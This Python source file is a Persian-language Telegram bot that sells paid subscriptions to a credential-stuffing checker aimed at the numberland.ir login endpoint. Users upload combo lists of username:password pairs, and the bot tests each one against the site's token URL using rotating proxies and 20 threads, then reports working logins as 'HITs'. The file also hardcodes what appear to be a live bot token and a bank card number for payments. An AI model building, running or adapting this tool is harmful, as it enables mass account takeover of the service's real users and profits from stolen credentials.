import telebot
from telebot import types
import requests
import threading
import concurrent.futures
import time
import os
from flask import Flask
import sqlite3
from datetime import datetime, timedelta

# ==================== تنظیمات ====================
BOT_TOKEN = "8529279687:AAHXVIKNws4_LCGy5ZaWMfZW0Eq87xYPpsA"
ADMIN_ID = 8476238641 # آیدی عددی خودت

PRICE_DAILY = 10000
PRICE_MONTHLY = 200000
CARD_NUMBER = "6219861463278415" # شماره کارت
CARD_HOLDER = "شکرپور"

LOGIN_URL = "https://auth.numberland.ir/token"
COMBO_FILE = "combo.txt"
PROXY_FILE = "proxy.txt"
THREADS = 20

# ==================== دیتابیس ====================
conn = sqlite3.connect('bot_database.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, expire_date TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS receipts (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, plan TEXT, photo_id TEXT, status TEXT)''')
conn.commit()

bot = telebot.TeleBot(BOT_TOKEN)
active_users = {}
stop_flags = {} # برای دکمه استوپ
print_lock = threading.Lock()

# خواندن پروکسی‌ها
proxies_list = []
if os.path.exists(PROXY_FILE):
    with open(PROXY_FILE, 'r') as f:
        proxies_list = [line.strip() for line in f if line.strip()]

def get_proxy():
    if not proxies_list:
        return None
    import random
    p = random.choice(proxies_list)
    if not p.startswith("http"):
        p = "http://" + p
    return {"http": p, "https": p}

# ==================== توابع اشتراک ====================
def get_expire_date(user_id):
    cursor.execute("SELECT expire_date FROM users WHERE id = ?", (user_id,))
    res = cursor.fetchone()
    return res[0] if res else None

def set_expire_date(user_id, date_str):
    cursor.execute("INSERT OR REPLACE INTO users (id, expire_date) VALUES (?, ?)", (user_id, date_str))
    conn.commit()

def is_subscribed(user_id):
    if user_id == ADMIN_ID:
        return True
    exp = get_expire_date(user_id)
    if not exp:
        return False
    exp_date = datetime.strptime(exp, '%Y-%m-%d %H:%M:%S')
    return datetime.now() < exp_date

def add_subscription(user_id, plan):
    now = datetime.now()
    current_exp = get_expire_date(user_id)
    if current_exp:
        current_exp_date = datetime.strptime(current_exp, '%Y-%m-%d %H:%M:%S')
        if current_exp_date > now:
            now = current_exp_date
    new_exp = now + timedelta(days=1 if plan == 'daily' else 30)
    set_expire_date(user_id, new_exp.strftime('%Y-%m-%d %H:%M:%S'))

# ==================== منوها ====================
def main_menu(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton('🚀 شروع چک'),
        types.KeyboardButton('🛒 خرید اشتراک'),
        types.KeyboardButton('👤 پروفایل من')
    )
    if user_id == ADMIN_ID:
        markup.add(types.KeyboardButton('👑 پنل ادمین'))
    return markup

def buy_menu():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton(f"اشتراک ۱ روزه ({PRICE_DAILY:,} تومان)", callback_data="buy_daily"),
        types.InlineKeyboardButton(f"اشتراک ۱ ماهه ({PRICE_MONTHLY:,} تومان)", callback_data="buy_monthly"),
        types.InlineKeyboardButton("🔙 برگشت", callback_data="back_main")
    )
    return markup

def back_button():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 برگشت", callback_data="back_main"))
    return markup

# ==================== دستورات ربات ====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "سلام! به ربات چکر نامبرلند خوش آمدید.\nاز منوی زیر انتخاب کنید:", reply_markup=main_menu(message.chat.id))

@bot.message_handler(func=lambda message: message.text == '🛒 خرید اشتراک')
def show_buy_menu(message):
    bot.send_message(message.chat.id, "یکی از پلن‌های زیر را انتخاب کنید:", reply_markup=buy_menu())

@bot.message_handler(func=lambda message: message.text == '👤 پروفایل من')
def show_profile(message):
    exp = get_expire_date(message.chat.id)
    if exp and is_subscribed(message.chat.id):
        bot.send_message(message.chat.id, f"👤 وضعیت اشتراک شما:\nفعال تا: `{exp}`", parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, "❌ شما اشتراک فعالی ندارید. لطفا خرید کنید.")

@bot.message_handler(func=lambda message: message.text == '🚀 شروع چک')
def start_check(message):
    if not is_subscribed(message.chat.id):
        bot.send_message(message.chat.id, "❌ برای استفاده از چکر ابتدا باید اشتراک خریداری کنید.", reply_markup=back_button())
        return
    
    if message.chat.id in active_users and active_users[message.chat.id]:
        bot.send_message(message.chat.id, "⚠️ شما یک عملیات در حال اجرا دارید.")
        return

    msg = bot.send_message(message.chat.id, "📁 لطفا فایل کمبو (txt.) خود را ارسال کنید.")
    bot.register_next_step_handler(msg, process_combo_file)

# ==================== پردازش کمبو و چکر ====================
def process_combo_file(message):
    if not message.document:
        bot.send_message(message.chat.id, "❌ لطفا فقط فایل ارسال کنید.", reply_markup=main_menu(message.chat.id))
        return
        
    chat_id = message.chat.id
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    with open(COMBO_FILE, 'wb') as new_file:
        new_file.write(downloaded_file)
        
    status_msg = bot.send_message(chat_id, "⏳ در حال شروع بررسی...")
    active_users[chat_id] = True
    stop_flags[chat_id] = False
    threading.Thread(target=run_checker, args=(chat_id, status_msg.message_id)).start()

def run_checker(chat_id, status_msg_id):
    try:
        with open(COMBO_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if ':' in line]
            
        total = len(combos)
        if total == 0:
            bot.send_message(chat_id, "❌ فایل خالی است.")
            return

        hits_found = 0
        checked = 0
        start_time = time.time()
        
        control_markup = types.InlineKeyboardMarkup()
        control_markup.add(
            types.InlineKeyboardButton("⏹ استوپ", callback_data=f"stop_{chat_id}"),
            types.InlineKeyboardButton("🔄 رفرش", callback_data=f"refresh_{chat_id}"),
            types.InlineKeyboardButton("🔙 برگشت", callback_data=f"back_main")
        )
        
        bot.edit_message_text(f"⏳ در حال چک کردن... (0/{total})", chat_id, status_msg_id, reply_markup=control_markup)

        def check_account(combo):
            nonlocal hits_found, checked
            if stop_flags.get(chat_id, False): return

            try:
                user, pwd = combo.split(':', 1)
            except ValueError:
                return

            headers = {
                "host": "auth.numberland.ir",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://numberland.ir",
                "referer": "https://numberland.ir/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            payload = f"username={user}&password={pwd}&grant_type=password&client_id=numberland_next&device_type=desktop"
            proxy = get_proxy()

            try:
                response = requests.post(LOGIN_URL, data=payload, headers=headers, proxies=proxy, timeout=15)
                if "access_token" in response.text:
                    with print_lock:
                        hits_found += 1
                        bot.send_message(chat_id, f"✅ **HIT** ✅\n`{combo}`", parse_mode='Markdown')
            except Exception:
                pass
            finally:
                with print_lock:
                    checked += 1
                    if checked % 20 == 0 or checked == total:
                        elapsed = time.time() - start_time
                        cpm = (checked / elapsed) * 60 if elapsed > 0 else 0
                        try:
                            bot.edit_message_text(
                                f"⏳ در حال چک کردن... ({checked}/{total})\n✅ هیت‌ها: {hits_found}\n⚡️ سرعت: {cpm:.0f} CPM",
                                chat_id, status_msg_id, reply_markup=control_markup
                            )
                        except:
                            pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
            executor.map(check_account, combos)

        bot.send_message(chat_id, f"✅ **پایان عملیات**\n\nهیت‌ها: {hits_found}\nکل: {total}", reply_markup=main_menu(chat_id))

    except Exception as e:
        bot.send_message(chat_id, f"خطا: {str(e)}")
    finally:
        active_users[chat_id] = False
        if os.path.exists(COMBO_FILE):
            os.remove(COMBO_FILE)

# ==================== پرداخت و رسید ====================
@bot.callback_query_handler(func=lambda call: call.data.startswith('buy_'))
def handle_buy(call):
    plan = call.data.split('_')[1]
    price = PRICE_DAILY if plan == 'daily' else PRICE_MONTHLY
    plan_name = "۱ روزه" if plan == 'daily' else "۱ ماهه"
    
    text = (f"🛒 شما پلن **{plan_name}** را انتخاب کردید.\n"
            f"💰 مبلغ: {price:,} تومان\n\n"
            f"لطفا مبلغ را به شماره کارت زیر واریز کنید:\n"
            f"💳 `{CARD_NUMBER}`\n"
            f"👤 به نام: {CARD_HOLDER}\n\n"
            f"سپس **عکس رسید** خود را همینجا ارسال کنید.")
            
    msg = bot.send_message(call.message.chat.id, text, parse_mode='Markdown', reply_markup=back_button())
    bot.register_next_step_handler(msg, handle_receipt, plan)

def handle_receipt(message, plan):
    if not message.photo:
        bot.send_message(message.chat.id, "❌ لطفا عکس رسید را ارسال کنید.", reply_markup=main_menu(message.chat.id))
        return

    photo_id = message.photo[-1].file_id
    user_id = message.chat.id
    
    cursor.execute("INSERT INTO receipts (user_id, plan, photo_id, status) VALUES (?, ?, ?, ?)", (user_id, plan, photo_id, 'pending'))
    conn.commit()
    receipt_id = cursor.lastrowid

    bot.send_message(user_id, "✅ رسید شما دریافت شد و برای بررسی به ادمین ارسال گردید.", reply_markup=main_menu(user_id))

    admin_markup = types.InlineKeyboardMarkup(row_width=2)
    admin_markup.add(
        types.InlineKeyboardButton("✅ تایید", callback_data=f"approve_{receipt_id}"),
        types.InlineKeyboardButton("❌ رد", callback_data=f"reject_{receipt_id}")
    )
    bot.send_photo(ADMIN_ID, photo_id, caption=f"🔔 **رسید جدید**\n\n👤 کاربر: `{user_id}`\n🛒 پلن: {plan}\n🆔 رسید: {receipt_id}", parse_mode='Markdown', reply_markup=admin_markup)

# ==================== کنترل رسید (ادمین) ====================
@bot.callback_query_handler(func=lambda call: call.data.startswith(('approve_', 'reject_')))
def handle_admin_decision(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔️ شما ادمین نیستید!")
        return

    action, receipt_id = call.data.split('_')
    cursor.execute("SELECT user_id, plan, status FROM receipts WHERE id = ?", (receipt_id,))
    res = cursor.fetchone()
    
    if not res or res[2] != 'pending':
        bot.answer_callback_query(call.id, "این رسید قبلا بررسی شده است.")
        return

    user_id, plan, _ = res

    if action == 'approve':
        add_subscription(user_id, plan)
        cursor.execute("UPDATE receipts SET status = 'approved' WHERE id = ?", (receipt_id,))
        conn.commit()
        bot.edit_message_caption("✅ تایید شد.", call.message.chat.id, call.message.message_id)
        bot.send_message(user_id, "🎉 اشتراک شما با موفقیت فعال شد!", reply_markup=main_menu(user_id))
    else:
        cursor.execute("UPDATE receipts SET status = 'rejected' WHERE id = ?", (receipt_id,))
        conn.commit()
        bot.edit_message_caption("❌ رد شد.", call.message.chat.id, call.message.message_id)
        bot.send_message(user_id, "❌ رسید شما رد شد. لطفا با پشتیبانی تماس بگیرید.")

# ==================== کنترل چکر (استوپ، رفرش، برگشت) ====================
@bot.callback_query_handler(func=lambda call: call.data.startswith(('stop_', 'refresh_')))
def handle_check_controls(call):
    action, user_id = call.data.split('_')
    user_id = int(user_id)

    if call.from_user.id != user_id:
        bot.answer_callback_query(call.id, "این دکمه‌ها برای شما نیست.")
        return

    if action == 'stop':
        stop_flags[user_id] = True
        bot.answer_callback_query(call.id, "⏹ عملیات متوقف شد.")
    elif action == 'refresh':
        bot.answer_callback_query(call.id, "🔄 وضعیت در حال به‌روزرسانی است...")

@bot.callback_query_handler(func=lambda call: call.data == 'back_main')
def back_to_main(call):
    bot.send_message(call.message.chat.id, "منوی اصلی:", reply_markup=main_menu(call.message.chat.id))

# ==================== پنل ادمین ====================
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        return
        
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton('📋 لیست کاربران')
    btn2 = types.KeyboardButton('➕ افزودن اشتراک')
    btn3 = types.KeyboardButton('➖ حذف اشتراک')
    btn4 = types.KeyboardButton('📢 ارسال پیام همگانی')
    btn5 = types.KeyboardButton('✉️ ارسال پیام به کاربر')
    btn6 = types.KeyboardButton('🔙 بازگشت به منوی اصلی')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    
    bot.send_message(message.chat.id, "👑 به پنل ادمین خوش آمدید.\nیکی از گزینه‌ها را انتخاب کنید:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '📋 لیست کاربران' and message.from_user.id == ADMIN_ID)
def list_users(message):
    cursor.execute("SELECT id, expire_date FROM users")
    users = cursor.fetchall()
    
    if not users:
        bot.send_message(message.chat.id, "هیچ کاربری در دیتابیس یافت نشد.")
        return
        
    text = "📋 **لیست کاربران:**\n\n"
    for u in users:
        user_id, exp = u
        status = "فعال" if is_subscribed(user_id) else "غیرفعال"
        text += f"👤 `{user_id}` | وضعیت: {status} | انقضا: {exp if exp else 'ندارد'}\n"
        
    if len(text) > 4000:
        text = text[:4000] + "\n\n... (لیست طولانی است)"
        
    bot.send_message(message.chat.id, text, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == '➕ افزودن اشتراک' and message.from_user.id == ADMIN_ID)
def admin_add_sub(message):
    msg = bot.send_message(message.chat.id, "لطفاً آیدی عددی کاربر را وارد کنید:")
    bot.register_next_step_handler(msg, process_add_sub_id)

def process_add_sub_id(message):
    try:
        user_id = int(message.text)
        msg = bot.send_message(message.chat.id, "چند روز اشتراک به او بدهیم؟ (مثلاً 30):")
        bot.register_next_step_handler(msg, process_add_sub_days, user_id)
    except ValueError:
        bot.send_message(message.chat.id, "❌ آیدی نامعتبر است. عملیات لغو شد.")

def process_add_sub_days(message, user_id):
    try:
        days = int(message.text)
        now = datetime.now()
        current_exp = get_expire_date(user_id)
        
        if current_exp:
            current_exp_date = datetime.strptime(current_exp, '%Y-%m-%d %H:%M:%S')
            if current_exp_date > now:
                now = current_exp_date
                
        new_exp = now + timedelta(days=days)
        set_expire_date(user_id, new_exp.strftime('%Y-%m-%d %H:%M:%S'))
        
        bot.send_message(message.chat.id, f"✅ اشتراک {days} روزه برای کاربر `{user_id}` تنظیم شد.", parse_mode='Markdown')
        try:
            bot.send_message(user_id, f"🎉 ادمین {days} روز اشتراک به شما هدیه داد!")
        except:
            pass
    except ValueError:
        bot.send_message(message.chat.id, "❌ تعداد روز نامعتبر است.")

@bot.message_handler(func=lambda message: message.text == '➖ حذف اشتراک' and message.from_user.id == ADMIN_ID)
def admin_remove_sub(message):
    msg = bot.send_message(message.chat.id, "لطفاً آیدی عددی کاربر را وارد کنید تا اشتراکش حذف شود:")
    bot.register_next_step_handler(msg, process_remove_sub)

def process_remove_sub(message):
    try:
        user_id = int(message.text)
        cursor.execute("DELETE FROM users WHERE id = ?", (user_id,))
        conn.commit()
        bot.send_message(message.chat.id, f"✅ اشتراک کاربر `{user_id}` حذف شد.", parse_mode='Markdown')
    except ValueError:
        bot.send_message(message.chat.id, "❌ آیدی نامعتبر است.")

@bot.message_handler(func=lambda message: message.text == '📢 ارسال پیام همگانی' and message.from_user.id == ADMIN_ID)
def admin_broadcast(message):
    msg = bot.send_message(message.chat.id, "لطفاً متن پیام همگانی را وارد کنید:")
    bot.register_next_step_handler(msg, process_broadcast)

def process_broadcast(message):
    text = message.text
    cursor.execute("SELECT id FROM users")
    users = cursor.fetchall()
    
    success = 0
    fail = 0
    bot.send_message(message.chat.id, "⏳ در حال ارسال پیام...")
    
    for u in users:
        try:
            bot.send_message(u[0], f"📢 **پیام از طرف مدیریت:**\n\n{text}", parse_mode='Markdown')
            success += 1
            time.sleep(0.05) # جلوگیری از بلاک شدن
        except:
            fail += 1
            
    bot.send_message(message.chat.id, f"✅ ارسال تمام شد.\nموفق: {success}\nناموفق: {fail}")

@bot.message_handler(func=lambda message: message.text == '✉️ ارسال پیام به کاربر' and message.from_user.id == ADMIN_ID)
def admin_send_to_user(message):
    msg = bot.send_message(message.chat.id, "آیدی عددی کاربر را وارد کنید:")
    bot.register_next_step_handler(msg, process_send_to_user_id)

def process_send_to_user_id(message):
    try:
        user_id = int(message.text)
        msg = bot.send_message(message.chat.id, "متن پیام را وارد کنید:")
        bot.register_next_step_handler(msg, process_send_to_user_text, user_id)
    except ValueError:
        bot.send_message(message.chat.id, "❌ آیدی نامعتبر است.")

def process_send_to_user_text(message, user_id):
    text = message.text
    try:
        bot.send_message(user_id, f"✉️ **پیام از طرف مدیریت:**\n\n{text}", parse_mode='Markdown')
        bot.send_message(message.chat.id, "✅ پیام با موفقیت ارسال شد.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ خطا در ارسال: {e}")

@bot.message_handler(func=lambda message: message.text == '🔙 بازگشت به منوی اصلی' and message.from_user.id == ADMIN_ID)
def back_to_main_from_admin(message):
    bot.send_message(message.chat.id, "منوی اصلی:", reply_markup=main_menu(message.chat.id))

@bot.message_handler(func=lambda message: message.text == '👑 پنل ادمین' and message.from_user.id == ADMIN_ID)
def admin_panel_btn(message):
    admin_panel(message)

# ==================== اجرا ====================
print("ربات روشن شد...")
try:
    bot.infinity_polling()
except Exception as e:
    print(f"خطای شبکه: {e}")
